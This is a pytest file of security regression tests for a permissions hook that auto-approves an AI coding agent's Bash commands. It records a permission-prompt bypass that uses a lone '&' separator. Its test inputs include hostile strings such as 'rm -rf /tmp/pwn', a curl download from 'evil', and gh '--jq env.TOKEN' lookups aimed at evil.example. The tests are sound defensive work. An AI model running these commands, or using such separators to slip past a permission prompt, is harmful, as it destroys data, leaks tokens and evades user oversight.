"""Security invariants for the PreToolUse permissions hook.

The hook auto-approves Bash calls whose every sub-command matches a user
allow pattern, bypassing Claude Code's write-safety prompt. Its whole safety
argument rests on `split_commands()` decomposing a compound command into the
parts that will actually execute — so any operator that runs a second command
but is NOT treated as a separator is a prompt bypass.

Regression coverage for the lone-`&` background-operator bypass (#258): a
lone `&` runs the command before it *and* the command after it, exactly like
`;`, but was appended as a literal character, so `allowed & evil` validated as
one token against a trailing-wildcard glob and auto-approved.

The redirection cases (`2>&1`, `&>`, `>&`, `<&`) are the counter-weight: `&`
inside a redirection is not a control operator and must stay literal, or the
fix would spuriously prompt on the single most common shell idiom there is.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
HOOK = REPO_ROOT / "plugin-hooks" / "pretooluse-permissions.sh"

# The allow-list SETUP_GUIDE recommends — trailing-wildcard globs.
ALLOW = ["Bash(git *)", "Bash(cat *)", "Bash(ls *)", "Bash(echo *)"]


def approves(tmp_path: Path, command: str, allow: list[str] | None = None) -> bool:
    """True iff the hook auto-approves `command` under the given allow-list.

    HOME and cwd are both isolated to tmp_path so the caller's real
    ~/.claude/settings.json can never leak a pattern into the decision.
    """
    claude = tmp_path / ".claude"
    claude.mkdir(exist_ok=True)
    (claude / "settings.json").write_text(
        json.dumps({"permissions": {"allow": allow if allow is not None else ALLOW}})
    )
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}
    proc = subprocess.run(
        ["bash", str(HOOK)], input=payload, capture_output=True, text=True,
        cwd=tmp_path, env=env, timeout=10,
    )
    return '"permissionDecision":"allow"' in proc.stdout


class TestLoneAmpersandIsASeparator:
    """#258 — a lone `&` runs a second command, so it must gate like `;`."""

    def test_allowed_then_evil_backgrounded_prompts(self, tmp_path):
        # `git status` is allowed; the backgrounded `rm -rf` is not.
        assert not approves(tmp_path, "git status & rm -rf /tmp/pwn")

    def test_allowed_then_evil_curl_prompts(self, tmp_path):
        assert not approves(tmp_path, "cat foo & curl http://evil/x -o /tmp/pwn")

    def test_evil_then_allowed_prompts(self, tmp_path):
        # Ordering must not matter — the non-matching part gates either way.
        assert not approves(tmp_path, "rm -rf /tmp/pwn & git status")


class TestKnownSeparatorsStillGate:
    """Regression guard: the operators that already worked must keep working."""

    def test_semicolon_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status; rm -rf /tmp/pwn")

    def test_logical_and_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status && rm -rf /tmp/pwn")

    def test_pipe_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status | rm -rf /tmp/pwn")


class TestLegitimateCommandsStillApprove:
    """The fix must not turn safe, allowed commands into prompts."""

    def test_single_allowed_command_approves(self, tmp_path):
        assert approves(tmp_path, "git status")

    def test_two_allowed_commands_approve(self, tmp_path):
        assert approves(tmp_path, "git status && git log")

    def test_trailing_background_of_allowed_command_approves(self, tmp_path):
        # `git log &` backgrounds a single allowed command — no second command.
        assert approves(tmp_path, "git log &")

    def test_redirect_stderr_to_stdout_approves(self, tmp_path):
        # `2>&1`: the `&` is fd-duplication, not a separator.
        assert approves(tmp_path, "git status 2>&1")

    def test_fd_dup_stdout_to_stderr_approves(self, tmp_path):
        # `>&2` duplicates stdout onto fd 2 — an fd-dup, not a file write, and the
        # `&` is not a separator (#258). A file target (`&> file`, `>& file`) is a
        # write and is prompted — see TestWriteRedirectionKeepsThePrompt.
        assert approves(tmp_path, "git status >&2")

    def test_fd_dup_explicit_form_approves(self, tmp_path):
        assert approves(tmp_path, "git status 1>&2")


# ─── redirections and project-supplied specs ──────────────────────────

def approves_split(tmp_path, command, *, user_allow, project_allow):
    """Approve `command` with DISTINCT user (HOME) and project (cwd) allow lists,
    so a rule's SOURCE (user vs repo) can be tested. The hook reads
    ~/.claude/settings.json (user) and ./.claude/settings.json (project)."""
    home = tmp_path / "home"
    work = tmp_path / "work"
    (home / ".claude").mkdir(parents=True, exist_ok=True)
    (work / ".claude").mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "settings.json").write_text(
        json.dumps({"permissions": {"allow": user_allow}})
    )
    (work / ".claude" / "settings.json").write_text(
        json.dumps({"permissions": {"allow": project_allow}})
    )
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = {"HOME": str(home), "PATH": "/usr/bin:/bin"}
    proc = subprocess.run(
        ["bash", str(HOOK)], input=payload, capture_output=True, text=True,
        cwd=work, env=env, timeout=10,
    )
    return '"permissionDecision":"allow"' in proc.stdout


class TestWriteRedirectionKeepsThePrompt:
    """A prefix rule must not auto-approve a redirected write to an arbitrary
    file — the sub-command carries the redirection, and `Bash(git *)` globs it."""

    def test_redirect_to_dotfile_prompts(self, tmp_path):
        assert not approves(tmp_path, "git log > /tmp/pwn-startup")

    def test_append_redirect_prompts(self, tmp_path):
        assert not approves(tmp_path, "echo evil >> /tmp/pwn-startup")

    def test_both_streams_to_file_prompts(self, tmp_path):
        assert not approves(tmp_path, "git log &> /tmp/pwn")

    def test_redirect_both_shorthand_to_file_prompts(self, tmp_path):
        assert not approves(tmp_path, "git log >& /tmp/pwn")

    def test_fd_dup_still_approves(self, tmp_path):
        # 2>&1 is fd-duplication, not a file write — must stay auto-approvable.
        assert approves(tmp_path, "git status 2>&1")

    def test_dev_null_still_approves(self, tmp_path):
        assert approves(tmp_path, "git status 2>/dev/null")

    def test_plain_allowed_command_still_approves(self, tmp_path):
        assert approves(tmp_path, "git status")


class TestProjectSuppliedSpecsAreRestricted:
    """A repository's own settings must not be able to grant the whole shell or
    a wildcard family; only the user's settings can. Exact project specs stand."""

    def test_project_bare_bash_does_not_approve(self, tmp_path):
        assert not approves_split(
            tmp_path, "rm -rf /tmp/pwn", user_allow=[], project_allow=["Bash"]
        )

    def test_project_wildcard_all_does_not_approve(self, tmp_path):
        assert not approves_split(
            tmp_path, "rm -rf /tmp/pwn", user_allow=[], project_allow=["Bash(*)"]
        )

    def test_project_wildcard_family_does_not_approve(self, tmp_path):
        assert not approves_split(
            tmp_path, "rm -rf /tmp/pwn", user_allow=[], project_allow=["Bash(rm *)"]
        )

    def test_project_exact_spec_still_approves(self, tmp_path):
        # an exact (wildcard-free) project grant is author-fixed and honoured
        assert approves_split(
            tmp_path, "make test", user_allow=[], project_allow=["Bash(make test)"]
        )

    def test_user_bare_bash_still_approves(self, tmp_path):
        assert approves_split(
            tmp_path, "rm -rf /tmp/pwn", user_allow=["Bash"], project_allow=[]
        )

    def test_user_wildcard_still_approves(self, tmp_path):
        assert approves_split(
            tmp_path, "git status", user_allow=["Bash(git *)"], project_allow=[]
        )


class TestProjectSpecsRejectEveryGlobMetachar:
    """ravi #364: bash `case` globs `?` and `[...]` too, so a project spec must be
    rejected for ANY glob metacharacter, not just `*`. The hook only DECIDES
    approve/deny — it never runs the command — and these assert it does NOT
    auto-approve a command a project-supplied glob would have matched."""

    def test_project_question_glob_dropped(self, tmp_path):
        # `ls ?` globs `ls x`; if the project spec survived, `ls x` would approve.
        assert not approves_split(tmp_path, "ls x", user_allow=[], project_allow=["Bash(ls ?)"])

    def test_project_bracket_glob_dropped(self, tmp_path):
        assert not approves_split(tmp_path, "ls x", user_allow=[], project_allow=["Bash(ls [xy])"])

    def test_project_rm_question_glob_dropped(self, tmp_path):
        # ravi's motivating case: `rm -rf ?` globs a single-char target such as
        # `rm -rf .`. The hook is a permission decider and executes nothing; this
        # asserts the project grant is rejected, so such a command would prompt.
        assert not approves_split(tmp_path, "rm -rf .", user_allow=[], project_allow=["Bash(rm -rf ?)"])

    def test_project_exact_literal_still_approves(self, tmp_path):
        # a glob-free (exact) project spec is still honoured
        assert approves_split(tmp_path, "make test", user_allow=[], project_allow=["Bash(make test)"])

    def test_user_glob_still_honoured(self, tmp_path):
        # the filter is project-only; the user's own glob is their choice
        assert approves_split(tmp_path, "ls x", user_allow=["Bash(ls ?)"], project_allow=[])


class TestTheLogIsPerUserAndPrivate:
    """The log holds whole command lines. It lives in the user's own state
    directory, readable by the user alone, never at a fixed path in /tmp."""

    @staticmethod
    def _run(tmp_path: Path, extra_env: dict | None = None) -> subprocess.CompletedProcess:
        claude = tmp_path / ".claude"
        claude.mkdir(exist_ok=True)
        (claude / "settings.json").write_text(json.dumps({"permissions": {"allow": ALLOW}}))
        payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "git status"}})
        env = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin", **(extra_env or {})}
        return subprocess.run(
            ["bash", str(HOOK)], input=payload, capture_output=True, text=True, cwd=tmp_path, env=env, timeout=10
        )

    def test_the_log_is_in_the_users_state_dir_and_readable_by_the_user_alone(self, tmp_path):
        proc = self._run(tmp_path)
        assert '"permissionDecision":"allow"' in proc.stdout, proc.stdout + proc.stderr
        log = tmp_path / ".local" / "state" / "claudna" / "permissions.log"
        assert log.is_file(), proc.stderr
        assert log.stat().st_mode & 0o077 == 0, oct(log.stat().st_mode)
        assert "git status" in log.read_text()

    def test_xdg_state_home_decides_where_it_goes(self, tmp_path):
        state = tmp_path / "state"
        self._run(tmp_path, {"XDG_STATE_HOME": str(state)})
        assert (state / "claudna" / "permissions.log").is_file()

    def test_the_hook_names_no_path_in_tmp(self):
        assert "/tmp" not in HOOK.read_text()


def decision(tmp_path: Path, command: str, allow: list[str] | None = None) -> str:
    """The hook's decision for `command`: 'allow', 'deny', or 'prompt' (no output)."""
    claude = tmp_path / ".claude"
    claude.mkdir(exist_ok=True)
    (claude / "settings.json").write_text(
        json.dumps({"permissions": {"allow": allow if allow is not None else ALLOW}})
    )
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}
    proc = subprocess.run(
        ["bash", str(HOOK)], input=payload, capture_output=True, text=True,
        cwd=tmp_path, env=env, timeout=10,
    )
    if '"permissionDecision":"deny"' in proc.stdout:
        return "deny"
    if '"permissionDecision":"allow"' in proc.stdout:
        return "allow"
    return "prompt"


class TestGhReadGuard:
    """A pre-approved `gh` READ verb can carry an environment token off the box, or
    reach a host other than github.com, through its own flags. The hook denies exactly
    those shapes — a hook 'deny' is the one decision that overrides an allow grant —
    and leaves every other gh call, including the fleet's real reads, untouched.

    The flag-by-flag rule and its allow-list live in plugin-hooks/gh-guard-decide.py
    (unit-tested separately)."""

    GH_ALLOW = ["Bash(gh pr list *)", "Bash(gh pr view *)", "Bash(gh api *)", "Bash(gh issue list *)"]

    def test_env_reading_jq_is_denied(self, tmp_path):
        assert decision(tmp_path, "gh pr list -R o/r --json number --jq 'env.TOKEN'", self.GH_ALLOW) == "deny"

    def test_foreign_host_repo_is_denied(self, tmp_path):
        assert decision(tmp_path, "gh pr list -R evil.example/o/r --search secret", self.GH_ALLOW) == "deny"

    def test_web_is_denied(self, tmp_path):
        assert decision(tmp_path, "gh pr list -R o/r --web", self.GH_ALLOW) == "deny"

    def test_a_url_positional_naming_a_host_is_denied(self, tmp_path):
        assert decision(tmp_path, "gh pr view https://evil.example/o/r/pull/1 --json number", self.GH_ALLOW) == "deny"

    def test_a_deny_overrides_a_bare_bash_grant(self, tmp_path):
        # A hook deny is the only decision that overrides an allow rule, bare Bash included.
        assert decision(tmp_path, "gh pr list --json number --jq env.TOKEN", ["Bash"]) == "deny"

    def test_a_deny_overrides_a_matching_allow_pattern(self, tmp_path):
        assert decision(tmp_path, "gh pr list --json number --jq env.TOKEN", self.GH_ALLOW) == "deny"

    def test_an_ordinary_read_still_approves(self, tmp_path):
        assert decision(tmp_path, "gh pr view 123 --json number,title", self.GH_ALLOW) == "allow"

    def test_a_field_jq_read_still_approves(self, tmp_path):
        assert decision(tmp_path, "gh api user --jq '.login'", self.GH_ALLOW) == "allow"

    def test_an_explicit_github_com_host_still_approves(self, tmp_path):
        assert decision(tmp_path, "gh pr list -R github.com/o/r --json number", self.GH_ALLOW) == "allow"

    def test_a_leaking_second_command_is_denied_even_after_an_allowed_first(self, tmp_path):
        assert decision(tmp_path, "gh pr view 1 --json number && gh pr list --jq env.TOKEN", self.GH_ALLOW) == "deny"

    def test_a_non_gh_command_is_unaffected(self, tmp_path):
        assert decision(tmp_path, "git status", self.GH_ALLOW + ["Bash(git *)"]) == "allow"
